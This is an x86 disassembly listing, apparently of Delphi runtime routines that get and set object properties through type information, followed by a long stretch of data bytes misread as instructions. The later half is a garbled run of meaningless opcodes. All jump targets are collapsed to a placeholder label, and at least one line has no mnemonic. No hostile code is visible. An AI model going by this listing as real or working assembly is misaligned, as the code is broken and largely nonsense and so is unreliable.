add [ eax + 0x640000ff ] bl
inc esi
inc edi
add [ ecx + 0x640000ff ] bl
inc esi
inc edi
add [ edx + 0x640000ff ] bl
inc esi
inc edi
add [ ebx + 0x640000ff ] bl
inc esi
inc edi
add [ edi + edi * 8 + 0x46640000 ] bl
inc edi
add [ ebp + 0x640000ff ] bl
inc esi
inc edi
add [ esi + 0x640000ff ] bl
inc esi
inc edi
add [ edi + 0x640000ff ] bl
inc esi
inc edi
add [ eax + 0x640000ff ] al
inc esi
inc edi
add [ ecx + 0x640000ff ] al
inc esi
inc edi
add [ edx + 0x640000ff ] al
inc esi
inc edi
add [ ebx + 0x640000ff ] al
inc esi
inc edi
add [ edi + edi * 8 + 0x46640000 ] al
inc edi
add [ ebp + 0x640000ff ] al
inc esi
inc edi
add [ esi + 0x640000ff ] al
inc esi
inc edi
add [ edi + 0x640000ff ] al
inc esi
inc edi
add [ eax + 0x640000ff ] cl
inc esi
inc edi
add [ ecx + 0x640000ff ] cl
inc esi
inc edi
add [ edx + 0x640000ff ] cl
inc esi
inc edi
add [ ebx + 0x640000ff ] cl
inc esi
inc edi
add [ edi + edi * 8 + 0x46640000 ] cl
inc edi
add [ ebp + 0x550000ff ] cl
mov ebp esp
xor eax eax
push ebp
push sub_410799
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4107a0
retn
sub_4107e4
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_410830
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_4107d8
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_408054
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4107e4
mov edx [ rw-data ]
mov eax esi
call sub_407ce4
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407ce4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_408054
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_410894
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_410904
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_410978
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_4109d4
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410a28
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_40427c
mov ecx esp
mov edx esi
mov eax ebx
call sub_4109d4
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_410a70
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_410a5c
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410ab0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_410af8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_40480c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_410b34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410aff
lea eax [ ebp - 0x4 ]
call sub_4046c0
retn
sub_410b08
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_410a28
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_410a70
pop ebx
retn
dec bl
je r-xdata
call sub_410ab0
jmp r-xdata
pop ebx
retn
sub_410b34
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_410bfa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404268
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_410b08
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410c01
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_4046fc
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_410c08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_4107d8
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_410c50 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_410d7f ]
jmp [ eax * 4 + jump_table_410cec ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_410e14
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_410e00
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410e54
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_410e8c
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_410ec8
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_405664
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_410f3c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410f82
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410f89
retn
mov eax rw-data
call sub_403fe0
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a68
sub_410f94
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410fb9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410fc0
retn
sub_411035
pop es
inc ebx
insb
popad
jae r-xdata
mov eax eax
mov ah 0x10
inc ecx
add [ ebx ] al
add ch [ esi ]
jae r-xdata
add [ ebx ] al
or [ eax + ecx * 2 + 0x65 ] edx
insb
jo r-xdata
push ebx
push 0x5746669
jae r-xdata
retn
inc eax
add [ eax + edx + 0x41 ] al
add [ ebx ] al
or [ edx + eax * 2 + 0x69 ] edx
inc esp
imul ecx [ ebp + 0x6f ] 0x16564
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x10 ] al
inc ecx
add [ 0x654c6462 ] cl
je r-xdata
outsb
je r-xdata
jns r-xdata
push esp
inc ecx
insb
je r-xdata
add [ eax ] al
add [ eax + 0x7004110 ] dh
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ esi ] al
outsd
push edx
imul esp [ edi + 0x68 ] 0x64620d74
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
add [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ gs : eax ] eax
push es
jae r-xdata
jae r-xdata
sbb [ edx + 0x64 ] ah
push edx
bound esp [ edx + edx * 2 + 0x69 ]
push 0x4c6f5474
je r-xdata
add ah dh
adc [ eax ] al
lea eax [ eax ]
add [ edx ] dl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx + 0xc0041 ] bh
add [ eax ] al
adc [ edx ] dl
inc ecx
add al bl
xor al 0x40
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ edx ] dl
inc ecx
add [ eax + eax ] cl
outsd
cmp [ ecx ] dl
inc ecx
add [ ecx ] cl
push 0x79654b74
ja r-xdata
dec esp
je r-xdata
add [ eax ] al
inc ebx
insb
or [ gs : ebx + 0x73 ] dh
popad
imul ebp [ fs : esi + 0x67 ] 0x796c6e4f
pop es
jae r-xdata
imul esp [ edi + 0x68 ] 0x4c6f5474
outsd
inc ecx
insb
imul esp [ edi + 0x6e ] 0x52646218
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
inc eax
add [ edx + edx + 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx + 0x41 ] bl
add [ eax + eax ] cl
add [ eax ] al
mov ah 0x11
inc ecx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax + 0x74 ] ebp
inc ebx
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al [ ecx ]
or al 0x0
jb r-xdata
inc esp
outsd
jne r-xdata
or [ ebx + 0x73 ] dh
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
adc [ ecx ] eax
or [ eax + 0x74 ] ebp
insb
insb
pop es
inc ebx
insb
popad
jae r-xdata
add [ ecx ] al
or al 0x54
dec eax
insb
jo r-xdata
jae r-xdata
mov eax eax
and [ ecx ] dl
je r-xdata
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ebx ] cl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
adc eax [ ecx ]
or al 0x0
add [ eax ] al
adc [ edx ] dl
inc ecx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ebx ] cl
inc ebp
inc esi
dec edi
jo r-xdata
outsd
jb r-xdata
js r-xdata
dec ebx
jns r-xdata
dec ebp
imul esp [ esp + 0x6c ] 0x73730865
push edx
imul esp [ edi + 0x68 ] 0x73730874
add [ ecx ] ecx
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
popad
jae r-xdata
outsd
outsb
je r-xdata
jae r-xdata
xor [ ecx ] eax
add [ eax ] al
add [ eax ] al
push es
shl [ eax + edx + 0x2030041 ] 0x2e
add [ eax ] al
mov ah 0x11
inc ecx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
adc eax [ ecx ]
or al 0x0
adc eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
inc ebp
jb r-xdata
inc eax
add [ eax + 0x10004032 ] al
rcr [ eax ] 0x13
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
add [ eax ] al
and al 0x13
inc ecx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edx ] cl
inc ebp
push edx
popad
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
inc ebp
jb r-xdata
add [ eax + 0xc004032 ] al
inc ebp
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ 0x72434645 ] cl
popad
je r-xdata
inc eax
add [ edx + edx + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc004112
add [ eax ] al
add [ eax ] dl
adc al [ ecx ]
fdiv [ eax + eax * 2 ]
push 0xd800406f
pop es
inc ebx
insb
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ ecx + edx + 0xc080041 ] cl
push esp
dec esi
outsd
je r-xdata
inc ecx
or [ ecx ] dl
inc ecx
add [ esi ] al
or edx [ ebx + edx * 2 + 0x68 ]
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : eax - 0x74ffbef0 ] esi
shl [ eax ] 0x11
xor al 0x40
add ah ah
jae r-xdata
je r-xdata
js r-xdata
dec edi
outsb
insb
jns r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x14 ] bh
inc ecx
add [ eax + eax ] cl
add [ eax ] al
and al 0x13
inc ecx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ esi ] cl
inc ebp
inc ebx
insb
popad
jae r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4113 0x0
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
inc ebp
jb r-xdata
popad
xor [ edx ] 0x40
add [ eax * 2 + 0x65727453 ] cl
popad
jns r-xdata
jae r-xdata
je r-xdata
outsd
dec esp
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
adc [ ecx ] eax
jb r-xdata
add al 0x1
add [ eax ] al
cmp bh 0xff
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
dec esi
outsd
je r-xdata
inc ebp
inc esi
imul ebp [ ebp + 0x72 ] 0x6f727245
jb r-xdata
sub [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax + 0xb004032 ] al
and [ ecx + eax * 2 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
adc al 0x41
add [ eax + eax ] cl
add [ eax ] al
and al 0x13
inc ecx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ebx ] cl
inc ebp
push edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
adc eax [ ecx ]
adc eax [ ecx ]
add [ eax ] al
add [ eax + 0x6f ] ch
inc eax
add al bl
jbe r-xdata
je r-xdata
push 0x6e6f4374
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax * 2 + 0x4e736552 ] cl
outsd
je r-xdata
mov [ 0x41 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al [ eax ]
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push ebx
je r-xdata
xor al [ eax ]
or al 0x45
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edx ] cl
inc ebp
dec esp
imul esi [ ebx + 0x74 ] 0x6f727245
jb r-xdata
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
adc eax 0xc0041
add [ eax ] al
push 0xd800406f
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] dl
inc ebp
push ebx
je r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ 0xc0041 ] dl
add [ eax ] al
push 0xd800406f
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax + eax ] cl
add [ eax ] al
push 0xd800406f
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
nop
aam 0x14
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ 0xc0041 ] dl
add [ eax ] al
push 0xd800406f
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edx ] cl
lea eax [ eax ]
xor [ 0x41 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x7473694c
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x14
inc ecx
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
push dx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx + 0x100041 ] bl
add [ eax ] al
sub al 0x70
inc eax
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
outsd
jb r-xdata
add [ eax ] al
add ah dl
adc al 0x41
adc al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec ecx
outsb
jbe r-xdata
sar [ edi + edx + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx + 0x240041 ] bh
add [ eax ] al
mov al [ 0xffffffffd8004010 ]
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add [ eax ] al
add [ eax - 0x27ffbff0 ] ah
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
